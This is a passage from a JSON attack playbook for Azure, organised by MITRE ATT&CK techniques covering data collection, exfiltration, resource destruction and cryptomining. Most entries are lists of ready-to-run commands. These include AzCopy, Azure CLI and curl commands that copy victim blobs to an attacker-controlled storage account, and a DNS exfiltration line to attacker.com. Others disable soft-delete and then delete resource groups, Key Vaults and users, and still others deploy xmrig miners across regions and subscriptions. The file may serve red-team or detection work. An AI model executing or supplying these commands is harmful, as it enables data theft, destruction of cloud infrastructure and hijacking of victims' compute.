        "$ctx = New-AzStorageContext -StorageAccountName storageacct -StorageAccountKey <key>",
        "# Azure PowerShell - List and download blobs",
        "Get-AzStorageBlob -Container containername -Context $ctx | Get-AzStorageBlobContent -Destination ./download",
        "# Generate SAS token for later access",
        "az storage container generate-sas --account-name storageacct --name containername --permissions rl --expiry 2025-12-31 --auth-mode login",
        "# Search blobs for sensitive files",
        "az storage blob list --account-name storageacct --container-name containername --query \"[?contains(name,'.config') || contains(name,'.json') || contains(name,'.key')]\"",
        "# Access using storage account keys",
        "az storage account keys list --account-name storageacct --resource-group rg-name",
        "az storage blob list --account-name storageacct --container-name containername --account-key <key>"
      ]
    },
    {
      "id": "AZ-COLL-002",
      "mitre_id": "T1213.003",
      "name": "SharePoint/OneDrive Data Collection",
      "phase": "collection",
      "infrastructure": "azure",
      "description": "Access and download sensitive data from SharePoint and OneDrive",
      "prerequisites": ["Valid Azure AD credentials with access"],
      "tools": ["Graph API", "Custom scripts", "OneDrive sync"],
      "detection": "M365 audit logs, unusual file access",
      "references": ["https://attack.mitre.org/techniques/T1213/003/"],
      "next_techniques": ["AZ-EXFIL-001"],
      "risk_level": "high",
      "commands": [
        "# Microsoft Graph API - List user's OneDrive files",
        "az rest --method GET --url 'https://graph.microsoft.com/v1.0/me/drive/root/children'",
        "# Microsoft Graph API - Search OneDrive",
        "az rest --method GET --url \"https://graph.microsoft.com/v1.0/me/drive/root/search(q='password')\"",
        "# Microsoft Graph API - Download file from OneDrive",
        "az rest --method GET --url 'https://graph.microsoft.com/v1.0/me/drive/items/<item-id>/content' --output-file downloaded.docx",
        "# Microsoft Graph API - List SharePoint sites",
        "az rest --method GET --url 'https://graph.microsoft.com/v1.0/sites?search=*'",
        "# Microsoft Graph API - Get SharePoint site contents",
        "az rest --method GET --url 'https://graph.microsoft.com/v1.0/sites/<site-id>/drive/root/children'",
        "# Microsoft Graph API - Search SharePoint",
        "az rest --method GET --url \"https://graph.microsoft.com/v1.0/sites/<site-id>/drive/root/search(q='confidential')\"",
        "# PowerShell PnP - Connect to SharePoint",
        "Connect-PnPOnline -Url https://target.sharepoint.com/sites/sitename -Interactive",
        "# PowerShell PnP - List files",
        "Get-PnPListItem -List 'Documents' | Select-Object FileLeafRef, FileRef",
        "# PowerShell PnP - Download files",
        "Get-PnPFile -Url '/sites/sitename/Shared Documents/secret.docx' -Path ./downloads -AsFile",
        "# Download entire document library",
        "Get-PnPListItem -List 'Documents' | ForEach-Object { Get-PnPFile -Url $_.FieldValues.FileRef -Path ./downloads -AsFile }",
        "# AADInternals - Access OneDrive",
        "$token = Get-AADIntAccessTokenForMSGraph",
        "Get-AADIntOneDriveFiles -AccessToken $token",
        "# List shared files accessible to user",
        "az rest --method GET --url 'https://graph.microsoft.com/v1.0/me/drive/sharedWithMe'"
      ]
    },
    {
      "id": "AZ-EXFIL-001",
      "mitre_id": "T1537",
      "name": "Azure Storage Exfiltration",
      "phase": "exfiltration",
      "infrastructure": "azure",
      "description": "Exfiltrate data by copying to attacker-controlled storage account",
      "prerequisites": ["Storage access", "Internet connectivity"],
      "tools": ["AzCopy", "Azure CLI", "Custom scripts"],
      "detection": "Storage logs, network monitoring",
      "references": ["https://attack.mitre.org/techniques/T1537/"],
      "next_techniques": [],
      "risk_level": "high",
      "commands": [
        "# AzCopy - Copy to attacker storage account",
        "azcopy copy 'https://victim-storage.blob.core.windows.net/data/*' 'https://attacker-storage.blob.core.windows.net/exfil?<sas-token>' --recursive",
        "# Azure CLI - Copy blob to external account",
        "az storage blob copy start --account-name attacker-storage --destination-blob exfil.zip --destination-container data --source-uri 'https://victim-storage.blob.core.windows.net/container/sensitive.zip?<sas>'",
        "# Create SAS token for external access",
        "az storage container generate-sas --account-name victim-storage --name sensitive-data --permissions rl --expiry 2025-12-31 --https-only",
        "# Share SAS URL externally for data access",
        "# URL: https://victim-storage.blob.core.windows.net/sensitive-data?<generated-sas>",
        "# Azure CLI - Download locally then exfil",
        "az storage blob download-batch --account-name victim-storage --source container --destination /tmp/exfil",
        "tar -czf /tmp/exfil.tar.gz /tmp/exfil",
        "curl -X PUT -T /tmp/exfil.tar.gz 'https://attacker-storage.blob.core.windows.net/upload/exfil.tar.gz?<sas>'",
        "# PowerShell - Exfil via Azure Storage",
        "$ctx = New-AzStorageContext -StorageAccountName attacker-storage -StorageAccountKey <key>",
        "Set-AzStorageBlobContent -File ./sensitive-data.zip -Container exfil -Blob data.zip -Context $ctx",
        "# AzCopy sync for incremental exfil",
        "azcopy sync 'https://victim.blob.core.windows.net/data' 'https://attacker.blob.core.windows.net/mirror?<sas>' --recursive",
        "# Use Azure File Share for exfil",
        "az storage file upload-batch --account-name attacker-storage --destination exfil-share --source ./stolen-data",
        "# Exfil via Azure Data Factory (if available)",
        "# Create pipeline to copy data to external storage",
        "# Encode and exfil via DNS (small data)",
        "# base64 data.txt | xargs -I {} nslookup {}.attacker.com"
      ]
    },
    {
      "id": "AZ-IMPACT-001",
      "mitre_id": "T1485",
      "name": "Azure Resource Destruction",
      "phase": "impact",
      "infrastructure": "azure",
      "description": "Delete Azure resources, storage accounts, or entire resource groups",
      "prerequisites": ["Owner or Contributor role"],
      "tools": ["Azure CLI", "Az PowerShell"],
      "detection": "Azure Activity Logs, deletion events",
      "references": ["https://attack.mitre.org/techniques/T1485/"],
      "next_techniques": [],
      "risk_level": "critical",
      "commands": [
        "# Azure CLI - Delete entire resource group (destructive!)",
        "az group delete --name rg-name --yes --no-wait",
        "# Azure CLI - Delete storage account",
        "az storage account delete --name storageacct --resource-group rg-name --yes",
        "# Azure CLI - Delete all blobs in container",
        "az storage blob delete-batch --account-name storageacct --source containername",
        "# Azure CLI - Delete VM",
        "az vm delete --resource-group rg-name --name vmname --yes",
        "# Azure CLI - Delete Key Vault (with purge)",
        "az keyvault delete --name vault-name --resource-group rg-name",
        "az keyvault purge --name vault-name --location <location>",
        "# Azure CLI - Delete SQL database",
        "az sql db delete --resource-group rg-name --server server-name --name db-name --yes",
        "# Azure PowerShell - Delete resource group",
        "Remove-AzResourceGroup -Name rg-name -Force -AsJob",
        "# Azure PowerShell - Delete all resources in subscription",
        "Get-AzResource | Remove-AzResource -Force",
        "# Disable soft-delete before destroying",
        "az keyvault update --name vault-name --enable-soft-delete false",
        "az storage account blob-service-properties update --account-name storageacct --enable-delete-retention false",
        "# Delete Azure AD users",
        "az ad user delete --id user@target.com",
        "# Delete App registrations",
        "az ad app delete --id <app-id>",
        "# Delete automation account to stop scheduled tasks",
        "az automation account delete --resource-group rg-name --name automation-account-name --yes",
        "# WARNING: These commands cause data loss and service disruption"
      ]
    },
    {
      "id": "AZ-IMPACT-002",
      "mitre_id": "T1496",
      "name": "Azure Cryptomining",
      "phase": "impact",
      "infrastructure": "azure",
      "description": "Deploy VMs or containers for cryptocurrency mining",
      "prerequisites": ["Compute resource creation permissions"],
      "tools": ["Mining software", "Azure CLI"],
      "detection": "Cost alerts, Defender for Cloud findings",
      "references": ["https://attack.mitre.org/techniques/T1496/"],
      "next_techniques": [],
      "risk_level": "high",
      "commands": [
        "# Azure CLI - Create VM for mining",
        "az vm create --resource-group rg-name --name miner-vm --image UbuntuLTS --size Standard_NC6 --admin-username miner --generate-ssh-keys",
        "# Azure CLI - Create multiple VMs across regions",
        "for region in eastus westus northeurope; do az vm create --resource-group rg-$region --name miner-$region --image UbuntuLTS --size Standard_F16s_v2 --location $region --admin-username miner --generate-ssh-keys --no-wait; done",
        "# Azure CLI - Deploy container instance with miner",
        "az container create --resource-group rg-name --name miner-container --image attacker/xmrig-miner --cpu 4 --memory 8 --restart-policy Always",
        "# Azure CLI - Run mining command on existing VM",
        "az vm run-command invoke --resource-group rg-name --name vmname --command-id RunShellScript --scripts 'wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar xf xmrig* && ./xmrig*/xmrig -o pool.minexmr.com:4444 -u wallet_address'",
        "# Create AKS cluster for mining",
        "az aks create --resource-group rg-name --name miner-aks --node-count 3 --node-vm-size Standard_NC6",
        "# Deploy mining pods to AKS",
        "kubectl apply -f - <<EOF\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: miner\nspec:\n  replicas: 10\n  template:\n    spec:\n      containers:\n      - name: xmrig\n        image: metal3d/xmrig\nEOF",
        "# Use Azure Batch for distributed mining",
        "az batch account create --name miner-batch --resource-group rg-name --location eastus",
        "# Create spot VMs for cheaper mining (may be evicted)",
        "az vm create --resource-group rg-name --name spot-miner --image UbuntuLTS --priority Spot --max-price 0.01 --size Standard_F16s_v2",
        "# Use Azure Functions consumption plan (limited but hard to detect)",
        "# Deploy mining code as timer-triggered function",
        "# Scale across multiple subscriptions if compromised",
        "for sub in sub1 sub2 sub3; do az account set -s $sub; az vm create ... ; done"
      ]
    }
  ]
}
